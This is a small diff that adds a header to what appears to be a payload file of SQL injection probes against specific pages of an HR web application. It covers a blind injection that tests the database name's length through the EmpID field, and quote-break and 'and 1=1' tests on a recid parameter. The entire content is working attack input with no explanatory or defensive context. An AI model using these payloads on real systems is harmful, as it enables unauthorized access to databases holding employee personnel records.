@@ -1,3 +1,4 @@
+url
 /HR3/Common/ErrorPage/SystemSettingInfo.aspx	__EVENTTARGET=BtnOk&EmpID=766360' and len(DB_name())=2 and '1'='1
 /hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=1''
 /hr3/personnel/lzh/lzhdisciplineedit.aspx   recid=1' and '1'='1
